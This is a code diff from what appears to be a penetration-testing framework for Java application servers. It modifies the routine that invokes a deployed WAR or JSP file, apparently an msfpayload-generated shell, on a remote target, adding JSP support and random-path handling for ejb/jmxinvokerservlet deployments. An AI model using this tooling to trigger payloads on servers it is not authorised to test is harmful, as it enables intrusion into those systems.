@@ -22,7 +22,7 @@ def invoke(fingerengine, fingerprint, deployer):
                             fingerengine.options.remote_service, LOG.ERROR)
 
 def invoke_war(fingerengine, fingerprint):
-    """  Invoke a deployed WAR file on the remote server.
+    """  Invoke a deployed WAR or JSP file on the remote server.
 
     This uses unzip because Python's zip module isn't very portable or
     fault tolerant; i.e. it fails to parse msfpayload-generated WARs, though
@@ -30,14 +30,18 @@ def invoke_war(fingerengine, fingerprint):
     """
 
     dfile = fingerengine.options.deploy
+    jsp = ''
 
-    jsp = getoutput("unzip -l %s | grep jsp" % dfile).split(' ')[-1]
+    if '.war' in dfile:
+        jsp = getoutput("unzip -l %s | grep jsp" % dfile).split(' ')[-1]
+    elif '.jsp' in dfile:
+        jsp = dfile
+
     if jsp == '':
         utility.Msg("Failed to find a JSP in the deployed WAR", LOG.DEBUG)
         return
 
-    else:
-        utility.Msg("Using JSP {0} from {1} to invoke".format(jsp, dfile), LOG.DEBUG)
+    utility.Msg("Using JSP {0} from {1} to invoke".format(jsp, dfile), LOG.DEBUG)
 
     war_path = parse_war_path(dfile)
     try:
@@ -48,10 +52,19 @@ def invoke_war(fingerengine, fingerprint):
     except:
         pass
 
-    url = "http://{0}:{1}/{2}/{3}".format(fingerengine.options.ip,
-                                          fingerprint.port,
-                                          war_path,
-                                          jsp)
+    url = "http://{0}:{1}/{2}/{3}"
+    if 'random_int' in dir(fingerengine):
+        # we've deployed via ejb/jmxinvokerservlet, so the path
+        # will be based upon a random number
+        url = url.format(fingerengine.options.ip,
+                         fingerprint.port,
+                         war_path + str(fingerengine.random_int),
+                         jsp)
+    else:
+        url = url.format(fingerengine.options.ip,
+                         fingerprint.port,
+                         war_path,
+                         jsp)
 
     if _invoke(url): 
         utility.Msg("{0} invoked at {1}".format(dfile, fingerengine.options.ip))
